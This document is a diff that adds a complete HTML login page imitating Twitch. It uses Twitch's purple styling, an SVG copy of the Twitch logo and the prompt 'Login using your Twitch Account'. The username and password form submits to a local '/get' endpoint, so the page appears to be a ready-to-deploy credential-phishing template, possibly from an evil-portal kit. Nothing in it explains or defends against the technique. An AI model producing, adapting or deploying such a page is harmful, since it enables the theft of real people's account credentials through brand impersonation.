@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #9146FF;
+        color: white;
+        text-align: center;
+    }
+    .container {
+        max-width: 400px;
+        margin: auto;
+        padding: 20px;
+    }
+    .logo {
+        width: 140px;
+        height: 140px;
+    }
+    form {
+        background-color: white;
+        color: black;
+        padding: 20px;
+        border-radius: 5px;
+    }
+    input[type="text"], input[type="password"] {
+        width: 90%;
+        padding: 15px;
+        margin: 10px 0;
+        border: none;
+        background: #f1f1f1;
+    }
+    input[type="submit"] {
+        background-color: #9146FF;
+        color: white;
+        padding: 14px 20px;
+        border: none;
+        cursor: pointer;
+        width: 100%;
+    }
+    @media screen and (max-width: 600px) {
+        .container {
+            width: 95%;
+        }
+    }
+    .welcome {
+        font-size: 24px;
+        margin-bottom: 0;
+    }
+    .login {
+        font-size: 16px;
+        margin-top: 0;
+    }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" xmlns="http://www.w3.org/2000/svg" xml:space="preserve" viewBox="0 0 454.9 280.8"><path fill="#000000" fill-rule="evenodd" d="m379.6 67.6-18.3 18.2h-28.5l-15.6 15.6V85.8h-23.4V10.4h85.8v57.2ZM283.4 0l-5.2 20.8v93.6h23.4v13h13l13-13h20.7L390 72.8V0H283.4z"/><path fill="#000000" fill-rule="evenodd" d="M322.4 62.4h10.4V31.2h-10.4v31.2zm28.5 0h10.4V31.2H351v31.2zM444.5 182l-18.2-18.2h-33.8v-23.4H364V247h28.6v-54.6H416V247h28.6v-65Zm-91-18.2h-44.1L291.2 182v46.8l18.2 18.2h44.2v-28.6h-33.8v-26h33.8v-28.6zm-72.7 0h-23.4v-23.4h-28.6v88.4L247 247h33.8v-28.6h-23.4v-26h23.4v-28.6zm-62.4-23.4h-28.6v13h28.6v-13zm0 23.4h-28.6V247h28.6v-83.2zm-39 0h-28.6v54.6h-10.4v-54.6h-28.6v54.6h-10.4v-54.6H72.8V247h88.4l18.2-18.2v-65zm-117 0H39v-23.4H10.4v88.4L28.6 247h33.8v-28.6H39v-26h23.4v-28.6zm392.5 13v78l-39 26h-26v-13l-18.2 13h-23.3v-13l-13 13h-41.6l-13-13-2.6 13h-36.4l-15-13-.7 13h-41.3l-1.5-13-11.1 13h-63l-13-5.2v5.2H62.4l-39-23.4L0 234V130h49.4l23.4 23.4h106.6V130h88.4v23.4h23.4v13l13-13h26l23.4-23.4h49.3v23.4h28.6l23.4 23.4Z"></svg>
+        <h2 class="welcome">Welcome</h2>
+        <p class="login">Login using your Twitch Account</p>
+        <form action="/get?email=username&password=password" method="get">
+            <label for="uname"><b>Username</b></label>
+            <input type="text" placeholder="Enter Username" name="uname" required>
+            <label for="psw"><b>Password</b></label>
+            <input type="password" placeholder="Enter Password" name="psw" required>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>
